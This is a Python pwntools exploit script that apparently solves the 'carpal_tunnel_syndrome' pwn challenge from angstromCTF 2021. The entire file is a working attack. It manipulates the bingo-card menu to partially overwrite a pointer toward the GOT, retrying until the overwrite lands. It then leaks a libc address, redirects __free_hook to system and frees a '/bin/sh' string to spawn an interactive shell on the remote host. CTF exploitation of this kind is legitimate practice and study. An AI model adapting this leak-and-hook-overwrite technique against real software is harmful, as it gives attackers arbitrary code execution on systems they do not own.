from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './carpal_tunnel_syndrome'
HOST = 'pwn.2021.chall.actf.co'
PORT = 21840

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		# return process(TARGET)
		return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))


def mark(x, y):
	r.sendlineafter('Choice: ', '1')
	r.sendlineafter('space: ', '{} {}'.format(x, y))

def view(x, y):
	r.sendlineafter('Choice: ', '2')
	r.sendlineafter('space: ', '{} {}'.format(x, y))

def reset(idx, d):
	r.sendlineafter('Choice: ', '3')
	r.sendlineafter('reset: ', str(idx))
	r.sendlineafter('olumn: ', d)

def check_s(idx, d):
	r.sendlineafter('Choice: ', '4')
	r.sendlineafter('check: ', str(idx))
	r.sendlineafter('olumn: ', d)

def check(length, name, delete=True):
	r.sendlineafter('Choice: ', '5')
	if delete == True:
		r.sendlineafter(')? ', 'y')
	else:
		r.sendlineafter(')? ', 'n')
	r.sendlineafter(': ', str(length))
	r.sendafter(': ', name)

def change(m):
	r.sendlineafter('Choice: ', '6')
	r.sendlineafter('marker: ', m)

while(1):
	r = start()
	r.sendlineafter('now: ', 'a')
	for i in range(5):
		mark(0, i)
	check(0x27, 'A'*0x18+'\x70\x1f') # 1/16 point to got
	view(0, 4)
	try:
		r.recvuntil(': ')
		leak = u64(r.recvuntil('\n', True)+'\x00'*2)
		break
	except:
		r.close()


# context.log_level = 'debug'
base = leak - 0x9d850
fh = base + 0x1eeb28
system = base + 0x55410

if args.D:
	debug(r, [])

dbg('leak')
dbg('base')
for i in range(5):
	reset(i, 'r')
	reset(i, 'c')
change(p64(system))
for i in range(5):
	mark(0, i)
check(0x27, 'A'*0x10+p64(fh)) # extend bingo card

# free_hook -> system
mark(0, 5)

for i in range(5):
	reset(i, 'r')
	reset(i, 'c')

change('/bin/sh\x00')
for i in range(5):
	mark(0, i)

r.sendlineafter('Choice: ', '5')
r.sendlineafter(')? ', 'y')
r.interactive()
r.close()
